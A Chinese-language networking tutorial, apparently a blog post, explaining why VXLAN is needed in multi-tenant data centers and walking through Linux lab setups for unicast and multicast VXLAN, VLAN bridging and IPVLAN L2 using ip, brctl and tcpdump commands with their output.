<p>每台接入交换机连接48台物理服务器。这些服务器中的每一个都包含五个不同的租户，它们拥有自己的虚拟路由 (VRF)。一个租户由三个广播域组成：<code>Presiontation</code>， <code>Application</code> 和 <code>Database</code> ，每层都是互备的。在管理租户时，可以定义 <em><strong>VLAN ID</strong></em>、虚拟机的 <em><strong>MAC</strong></em> 地址和 <em><strong>IP</strong></em> 地址。虚拟机时可移动的，存在如下信息：</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/Figure1-1_Topology.jpeg" alt="img"  /></p>
<center>图：CSP DC network</center>
<center><em>Source：</em>https://nwktimes.blogspot.com/2018/02/vxlan-part-i-why-vxlan-is-needed.html</center><br>
<p>通过上述信息可以得知有如下：</p>
<ul>
<li>服务器：$20\times48=960$, 20为ToR交换机数量，48为每个ToR的接口</li>
<li>虚拟机/MAC地址/ARP：28800个虚拟机（每个物理机30个虚拟机）</li>
<li>广播域：每个租户+每个租户的VLAN+所拥有的物理机，$5\times3\times960=14400$</li>
<li>VRF：4800，5个租户+960个虚拟机</li>
</ul>
<p>在这种网络中存在的挑战如下：</p>
<ul>
<li><strong>VLAN ID的限制</strong>，通常来说VLAN ID只有12位，4096个，这意味着不够用</li>
<li><strong>多租户</strong>，多租户场景下，广播域等都是用户自己定义的，此时可能发生客户定义的ID为相同的</li>
<li><strong>MAC表大小限制</strong>，在一个租户下有28800个机器，意味着交换机MAC地址表存放28800个MAC地址。会出现老化过程。（Notes：<em>Cisco Nexus 9500/9300</em> 系列支持90000个MAC地址表）</li>
<li><strong>APR表大小限制</strong>，分布式交换机中存在超过28800条MAC-IP的数量（ Notes：<em>Cisco Nexus 9500</em>系列交换机支持 60,000 个 IPv4 ARP 和 30,000 个 IPv6 ND）</li>
<li><strong>生成树协议</strong>，在这种网络拓扑结构下，由于 STP 不支持链路之间的负载均衡，因此某些链路可能不会用于流量传输，这种情况下使带宽利用率下降。</li>
</ul>
<p>由于 <em><strong>VxLAN</strong></em> 通过L3建立隧道，因此不需要生成树协议。在基于 <em><strong>VxLAN</strong></em> 技术的 DC 中，VLAN将不再具有意义，因为 VLAN 是交换机甚至交换机端口特定的。</p>
<p>在基于 <em><strong>VxLAN</strong></em>  <em><strong>Leaf-Spine</strong></em> 的网络架构中，通过将网络压缩为一个L2的网络架构，所有的节点在访问其他节点时，都将仅需要两部，因此除了Leaf交换机之外，其余并不清楚虚拟机的MAC地址。</p>
<p>下图是<em><strong>Leaf-Spine</strong></em>网络拓扑图， 在该架构中，每个较低级别的接入（leaf）交换机都以全网状连接到每个较高级别的核心（spine）交换机。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/Tripp_Lite_3.2.width-880.png" alt="Tripp 精简版 3.2.png"  /></p>
<center>图：spine-leaf network</center>
<center><em>Source：</em>https://www.datacenterdynamics.com/en/marketwatch/spine-and-leaf-network-architecture-explained/</center><br>
<h3 id="vxlan-in-linux">VxLAN in Linux</h3>
<p>Linux 对 VxLAN 协议的支持时间并不久，2012 年 Stephen Hemminger 才把相关的工作合并到 kernel 中，并最终出现在 kernel 3.7.0 版本。为了稳定性和很多的功能，你可以会看到某些软件推荐在 3.9.0 或者 3.10.0 以后版本的 kernel 上使用 vxlan。</p>
<h4 id="linux实现vxlan网络">linux实现VxLAN网络</h4>
<p>两台机器构成一个VxLAN网络，每台机器上有一个 VTEP，VTEP 通过它们的 IP 互相通信。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/vxlan%20in%20linux.png" alt="vxlan in linux"  /></p>
<center>图：VxLAN in Linux</center>
<p>这个图创建的VxLAN0设备模拟了VTEP隧道端点，实现了一个大二层域，突破了虚拟化网络的物理界限。</p>
<p>node01</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link add vxlan1 <span class="nb">type</span> vxlan id <span class="m">1</span> remote 10.0.0.3 dstport <span class="m">4789</span> dev ens33
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> vxlan1 up
</span></span><span class="line"><span class="cl">ip addr add 192.168.100.1/24 dev vxlan1
</span></span></code></pre></td></tr></table>
</div>
</div><p>node02</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip link add vxlan1 type vxlan id 1 remote 10.0.0.14 dstport 4789 dev eth0
</span></span><span class="line"><span class="cl">ip link set vxlan1 up
</span></span><span class="line"><span class="cl">ip addr add 192.168.100.2/24 dev vxlan1
</span></span></code></pre></td></tr></table>
</div>
</div><p>上述命令创建了一个类型为vxlan，名为vxlan1的网络接口，期后面的为配置这个网络设备的内容：</p>
<ul>
<li><code>id 1</code>  类似CE设备的<code>vxlan vni 10</code> 设置的桥接域，只有相同的VNI之间可以直接进行二层通信。</li>
<li><code>dstport</code> VTEP 通信的端口，这里会监听一个udp端口</li>
<li><code>remote 10.0.0.3</code> 类似<code>vni 10 head-end peer-list 2.2.2.2</code> 用来设置隧道对端的 VTEP 地址，因为这里使用的为单播模式。</li>
<li><code>local 10.0.0.4</code> 与 <code>dev eth0</code> 类似于 <code>source 1.1.1.1</code> 配置源VTEP的IP地址。</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ tcpdump -np -i vxlan1 -vv
</span></span><span class="line"><span class="cl">tcpdump: listening on vxlan1, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, snapshot length <span class="m">262144</span> bytes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">05:07:20.589942 ARP, Ethernet <span class="o">(</span>len 6<span class="o">)</span>, IPv4 <span class="o">(</span>len 4<span class="o">)</span>, Request who-has 192.168.100.1 tell 192.168.100.2, length <span class="m">28</span>
</span></span><span class="line"><span class="cl">05:07:20.589963 ARP, Ethernet <span class="o">(</span>len 6<span class="o">)</span>, IPv4 <span class="o">(</span>len 4<span class="o">)</span>, Reply 192.168.100.1 is-at ca:21:c6:01:f9:d5, length <span class="m">28</span>
</span></span><span class="line"><span class="cl">05:07:20.590509 IP <span class="o">(</span>tos 0x0, ttl 64, id 26921, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto ICMP <span class="o">(</span>1<span class="o">)</span>, length 84<span class="o">)</span>
</span></span><span class="line"><span class="cl">    192.168.100.2 &gt; 192.168.100.1: ICMP <span class="nb">echo</span> request, id 1225, seq 1, length <span class="m">64</span>
</span></span><span class="line"><span class="cl">05:07:20.590525 IP <span class="o">(</span>tos 0x0, ttl 64, id 1264, offset 0, flags <span class="o">[</span>none<span class="o">]</span>, proto ICMP <span class="o">(</span>1<span class="o">)</span>, length 84<span class="o">)</span>
</span></span><span class="line"><span class="cl">    192.168.100.1 &gt; 192.168.100.2: ICMP <span class="nb">echo</span> reply, id 1225, seq 1, length <span class="m">64</span>
</span></span><span class="line"><span class="cl">05:07:21.593791 IP <span class="o">(</span>tos 0x0, ttl 64, id 27468, offset 0, flags <span class="o">[</span>DF<span class="o">]</span>, proto ICMP <span class="o">(</span>1<span class="o">)</span>, length 84<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>抓包查看对应的数据包  [vxlan_linux.cap](......\images\vxlan in linux\vxlan_linux.cap)</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210203232317906.png" alt="image-20210203232317906"  /></p>
<p>清理数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip link set vxlan1 down
</span></span><span class="line"><span class="cl">ip link delete vxlan1
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="多播模式的-vxlan">多播模式的 vxlan</h4>
<p>“多播”即“多点传送”(multicast)，也就是一台主机发出的包可以同时被其他多个有资格的主机接收，这台主机和那些有资格的主机就形成了一个组，他们在组内的通信是广播式的。多播的工作原理是，将一个网络上的某些主机的网卡设置成多播传送工作模式，指定其不过滤以某一个多播传送地址作为目的物理地址的数据帧，这样，这些主机的驱动程序中就可以同时接收以该多播传送地址作为目的物理地址的数据帧，而其他主机的驱动程序却接收不到，这些主机在逻辑上便形成了一个“多播”组。采用这种技术，相对广播而言，可有效减轻网络上“多播”组之外的其他主机的负担，因为发送给“多播”组的数据不会被传送到它们的驱动程序中去处理，避免资源的无谓浪费。</p>
<p>多播的IP范围为：从224.0.0.0到239.255.255.255。能够接收发往一个特定多播组地址数据的主机集合称为主机组 (host group)。一个主机组可跨越多个网络。主机组中成员可随时加入或离开主机组。主机组中对主机的数量没有限制，同时不属于某一主机组的主机可以向该组发送信息。</p>
<p><code>239.1.1.1</code> IIANA保留地址用于多播（多点传送）的IP，其mac地址为 <code>01:00:5e:01:01:01</code>(参考：<a href="https://blog.51cto.com/361531/891466">组播地址</a>)</p>
<p>要组成同一个 vxlan 网络，vtep 必须能感知到彼此的存在。多播组本来的功能就是把网络中的某些节点组成一个虚拟的组。</p>
<p>实验使用的为多播组组成一个虚拟的整体，通过多播组，组成可容纳多个主机组成 vxlan 网络</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210203232408799.png" alt="image-20210203232408799"  /></p>
<center>图：muticast VxLAN in Linux</center>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link add vxlan2 <span class="nb">type</span> vxlan id <span class="m">10</span> group 239.1.1.1 dstport <span class="m">4789</span> dev eth0
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> vxlan2 up
</span></span><span class="line"><span class="cl">ip addr add 192.168.100.10/24 dev vxlan2
</span></span></code></pre></td></tr></table>
</div>
</div><p>node01</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link add vxlan2 <span class="nb">type</span> vxlan id <span class="m">10</span> group 239.1.1.1 dstport <span class="m">4789</span> dev eth0
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> vxlan2 up
</span></span><span class="line"><span class="cl">ip addr add 192.168.100.20/24 dev vxlan2
</span></span></code></pre></td></tr></table>
</div>
</div><p><em><strong>FDB</strong></em> 是 Linux 网桥维护的一个二层转发表，用于保存远端虚拟机/容器的 MAC地址，远端 VTEP IP，以及 VNI 的映射关系，可以通过 <code>bridge fdb</code> 命令来对 <code>FDB</code> 表进行操作：</p>
<p>vxlan接口在创建后，fdb只有一个表项，就是所有<code>vxlan2</code>的流量都发往多播组</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ bridge fdb
</span></span><span class="line"><span class="cl">33:33:00:00:00:01 dev eth0 self permanent
</span></span><span class="line"><span class="cl">01:00:5e:00:00:01 dev eth0 self permanent
</span></span><span class="line"><span class="cl">01:00:5e:01:01:01 dev eth0 self permanent
</span></span><span class="line"><span class="cl">00:00:00:00:00:00 dev vxlan2 dst 239.1.1.1 via eth0 self permanent
</span></span></code></pre></td></tr></table>
</div>
</div><p>组播路由方式过程</p>
<ol>
<li>当发送<code>ping 192.168.100.10</code>时在同一个局域网内会先发送ARP广播，为组播方式，node1与node2（10.0.0.4）均受到广播，而node3（10.0.0.6）未受到</li>
<li>ARP报文要获得的内容为vxlan的mac地址，目的地址为全1的广播地址</li>
<li>vxlan隧道封装VNI=10，因为不知道目的地址，所以会发送多播报文</li>
<li>受到报文后进行解包，取出真实的报文，如果发现是自己的，经由隧道封装后传递</li>
<li>vtep 通过源报文学习到了 vtep 所在的主机，因此会直接单播发送给目的 vtep。发送方主机根据 VNI 把报文转发给 vtep，vtep 解包取出 ARP 应答报文，添加 arp 缓存到内核。并根据报文学习到目的 vtep 所在的主机地址，添加到 fdb 表中</li>
</ol>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210204010726897.png" alt="image-20210204010726897"  /></p>
<p>而没在多播组中的同网段主机没有受到对应的ARP广播</p>
<p>而在加入多播组中会受到多播的信息，确定不是自己后没有reply</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210204010149338.png" alt="image-20210204010149338"  /></p>
<p>此实验的报文内容</p>
<p>[192.168.10.30 加入同多播组](......\images\vxlan in linux\10.30.cap)</p>
<p>[192.168.10.20 发起端](......\images\vxlan in linux\10.20.cap)</p>
<p>[192.168.10.30 不在多播组内的报文](......\images\vxlan in linux\10.30 exit multicast.cap)</p>
<p>清除配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip link <span class="nb">set</span> vxlan2 down
</span></span><span class="line"><span class="cl">ip link delete vxlan2 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="实验一linux-bridgel2">实验一：Linux Bridge[L2]</h2>
<p>该实验包含 <em><strong>veth</strong></em>, <em><strong>vlan</strong></em>, <em><strong>Linux bridge</strong></em> 方面的</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210201195306279-166133333718927.png" alt="image-20210201195306279"  /></p>
<center>图：L2 vn topology</center><br>
<p>加载vlan模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">modprobe 8021q
</span></span><span class="line"><span class="cl"><span class="c1">## 查看核心是否提供VLAN 功能</span>
</span></span><span class="line"><span class="cl">dmesg <span class="p">|</span> grep -i <span class="m">802</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>    1.592802<span class="o">]</span> pci 0000:00:15.0: PME# supported from D0 D3hot D3cold
</span></span><span class="line"><span class="cl"><span class="o">[</span> 1755.995461<span class="o">]</span> 8021q: 802.1Q VLAN Support v1.8
</span></span><span class="line"><span class="cl"><span class="o">[</span> 1755.995485<span class="o">]</span> 8021q: adding VLAN <span class="m">0</span> to HW filter on device eth0
</span></span></code></pre></td></tr></table>
</div>
</div><p>安装命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">yum install vconfig -y
</span></span><span class="line"><span class="cl">apt install vlan
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建vlan</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 创建bridge</span>
</span></span><span class="line"><span class="cl">brctl addbr vlan10
</span></span><span class="line"><span class="cl">brctl show
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">ip link add veth01 <span class="nb">type</span> veth peer name eth01
</span></span><span class="line"><span class="cl">ip link add veth02 <span class="nb">type</span> veth peer name eth02
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 将veth对的一端加入网桥</span>
</span></span><span class="line"><span class="cl">brctl addif vlan10 veth01
</span></span><span class="line"><span class="cl">brctl addif vlan10 veth02
</span></span><span class="line"><span class="cl"><span class="c1"># 启动对应设备</span>
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> dev vlan10 up
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> dev veth01 up
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> dev veth02 up
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> dev eth01 up
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> dev eth02 up
</span></span><span class="line"><span class="cl"><span class="c1"># 创建ns</span>
</span></span><span class="line"><span class="cl">ip netns add net1
</span></span><span class="line"><span class="cl">ip netns add net2
</span></span><span class="line"><span class="cl"><span class="c1"># 将veth关联到对应名称空间内</span>
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> eth01 netns net1
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> eth02 netns net2
</span></span></code></pre></td></tr></table>
</div>
</div><p>网络名称空间net1内的操作，在vlan一端添加接口，与关联到该名称空间内的 <em>veth</em> 关联</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vconfig add eth01 3001
</span></span><span class="line"><span class="cl">vconfig add eth01 3002
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip link set eth01 up
</span></span><span class="line"><span class="cl">ip link set eth01.3001 up
</span></span><span class="line"><span class="cl">ip link set eth01.3002 up
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip addr add 192.168.100.1/24 dev eth01.3001
</span></span><span class="line"><span class="cl">ip addr add 192.168.100.2/24 dev eth01.3002
</span></span></code></pre></td></tr></table>
</div>
</div><p>网络名称空间net2与net1的类似</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vconfig add eth02 3001
</span></span><span class="line"><span class="cl">vconfig add eth02 3002
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip link set dev eth02 up
</span></span><span class="line"><span class="cl">ip link set dev eth02.3001 up
</span></span><span class="line"><span class="cl">ip link set dev eth02.3002 up
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip addr add 192.168.100.10/24 dev eth02.3001
</span></span><span class="line"><span class="cl">ip addr add 192.168.100.11/24 dev eth02.3002
</span></span></code></pre></td></tr></table>
</div>
</div><p>验证连通性，可以看到发送的包带有tag的标签</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210201211400463-166133333718928.png" alt="image-20210201211400463"  /></p>
<h2 id="实验二ipvlan-l2">实验二：IPVLAN L2</h2>
<p>实验结果，通过namespace模拟Pod的网络，做到各Pod间的网络通讯。</p>
<p><code>ip netns list</code> 查看网络命名空间</p>
<p><code>ip netns add net2</code> 创建一个网络命名空间</p>
<p><code>ip link add &lt;name&gt; link eth0 type ipvlan mode l2</code> 在当前名称空间创建一个类型为IPVLAN L2模式的接口，将该接口关联至父接口eth0上。</p>
<p><code>ip link set $name netns $nsName</code> 将接口加入到对应网络名称空间内</p>
<p><code>ip netns exec $nsName $cmd</code>  在对应的网络名称空间内运行命令</p>
<p>创建两个网络名称空间</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ip netns add net1
</span></span><span class="line"><span class="cl">$ ip netns add net2
</span></span><span class="line"><span class="cl">$ ip netns list
</span></span><span class="line"><span class="cl">net2
</span></span><span class="line"><span class="cl">net1
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建 IPVLAN 接口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ip link add ipvlan01 link eth0 <span class="nb">type</span> ipvlan mode l2
</span></span><span class="line"><span class="cl">$ ip link add ipvlan02 link eth0 <span class="nb">type</span> ipvlan mode l2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ip link <span class="nb">set</span> ipvlan01 netns net1
</span></span><span class="line"><span class="cl">$ ip link <span class="nb">set</span> ipvlan02 netns net2
</span></span></code></pre></td></tr></table>
</div>
</div><p>给对应接口添加IP地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ifconfig ipvlan01 192.168.0.1/24 up
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net2 ifconfig ipvlan02 192.168.0.2/24 up
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 这两个名称空间内的mac地址是一样的</span>
</span></span><span class="line"><span class="cl">$ ip netns <span class="nb">exec</span> net2 ifconfig
</span></span><span class="line"><span class="cl">ipvlan02: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
</span></span><span class="line"><span class="cl">        inet 192.168.0.2  netmask 255.255.255.0  broadcast 192.168.0.255
</span></span><span class="line"><span class="cl">        inet6 fe80::da78:c800:27a:fb26  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class="line"><span class="cl">        ether da:78:c8:7a:fb:26  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">39007</span>  bytes <span class="m">2394577</span> <span class="o">(</span>2.2 MiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">27</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">11</span>  bytes <span class="m">866</span> <span class="o">(</span>866.0 B<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ip netns <span class="nb">exec</span> net1 ifconfig
</span></span><span class="line"><span class="cl">ipvlan01: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
</span></span><span class="line"><span class="cl">        inet 192.168.0.1  netmask 255.255.255.0  broadcast 192.168.0.255
</span></span><span class="line"><span class="cl">        inet6 fe80::da78:c800:17a:fb26  prefixlen <span class="m">64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class="line"><span class="cl">        ether da:78:c8:7a:fb:26  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">132823</span>  bytes <span class="m">8184548</span> <span class="o">(</span>7.8 MiB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">93</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">12</span>  bytes <span class="m">936</span> <span class="o">(</span>936.0 B<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>测试两个名称空间是否互通</p>
<p>结论：可以看到两个名称空间内的子接口 (<em><strong>sub-interface</strong></em>) 通过其父接口 (<em><strong>parent-interface</strong></em>) 可以达到互通。子接口与父接口之间的不互通。<strong>IPVLAN L2模式仅限于子接口之间的互通</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ip netns <span class="nb">exec</span> net1 ping 192.168.0.2
</span></span><span class="line"><span class="cl">PING 192.168.0.2 <span class="o">(</span>192.168.0.2<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 192.168.0.2: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>0.285 ms
</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 192.168.0.2: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">64</span> <span class="nv">time</span><span class="o">=</span>0.077 ms
</span></span><span class="line"><span class="cl">^C
</span></span><span class="line"><span class="cl">--- 192.168.0.2 ping statistics ---
</span></span><span class="line"><span class="cl"><span class="m">2</span> packets transmitted, <span class="m">2</span> received, 0% packet loss, <span class="nb">time</span> 1027ms
</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 0.077/0.181/0.285/0.104 ms
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ip netns <span class="nb">exec</span> net2 ping 192.168.0.1
</span></span><span class="line"><span class="cl">PING 192.168.0.1 <span class="o">(</span>192.168.0.1<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
